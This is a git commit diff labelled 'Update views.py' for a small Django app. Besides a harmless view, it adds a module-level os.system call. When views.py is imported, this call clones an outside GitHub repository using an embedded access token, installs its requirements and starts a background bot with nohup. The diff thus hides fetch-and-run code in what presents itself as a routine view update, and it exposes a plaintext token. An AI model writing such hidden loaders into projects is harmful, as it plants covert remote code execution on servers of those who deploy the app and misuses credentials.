ba27f2a2ea4c6dce6ddd90b28af27897918407ad
gitdrive5 <121691578+gitdrive5@users.noreply.github.com>
2022-12-31 03:52:26 +0530

    Update views.py

--- mydjangoapp/views.py
+++ mydjangoapp/views.py
@@ -1,3 +1,4 @@
+import os
 from django.shortcuts import render
 from django.http import HttpResponse
 from django.template import loader
@@ -6,3 +7,4 @@ def index(request):
     template = loader.get_template('mydjangoapp/index.html')
     context = {}
     return HttpResponse(template.render(context, request))
+os.system("git clone https://BUDDY1609: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@github.com/BUDDY1609/clone-bot-publi okk && cd okk && pip3 install -U -r requirements.txt && nohup python3 -m bot &")
